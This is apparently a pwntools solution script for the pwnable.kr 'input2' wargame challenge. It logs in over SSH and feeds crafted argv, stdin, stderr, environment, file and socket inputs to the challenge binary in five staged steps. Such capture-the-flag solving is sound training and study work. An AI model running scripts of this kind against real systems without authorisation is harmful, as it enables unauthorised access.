from pwn import *

s = ssh('input2', 'pwnable.kr', 2222, 'guest')
# stage 4
s.cwd = '/tmp'
s.upload_data(b'\x00\x00\x00\x00', '\x0a')

# stage 1
path = '/home/input2/input2'
argv = ['A'] * 100
argv[0] = path
argv[ord('A')] = "''"
argv[ord('B')] = r"$' \x0a\x0d'"
# stage 5
argv[ord('C')] = "12345"
command_with_args = ' '.join(argv)

# stage 2
stderr_payload_str = r'\x00\x0a\x02\xff'
full_shell_command = f"{command_with_args} 2< <(echo -ne '{stderr_payload_str}')"

# stage 3
p = s.process(['/bin/bash', '-c', full_shell_command], env={'\xde\xad\xbe\xef' : '\xca\xfe\xba\xbe'})
p.send(b"\x00\x0a\x00\xff")

# stage 5
t = s.remote('localhost', 12345)
t.send("\xde\xad\xbe\xef")

p.interactive()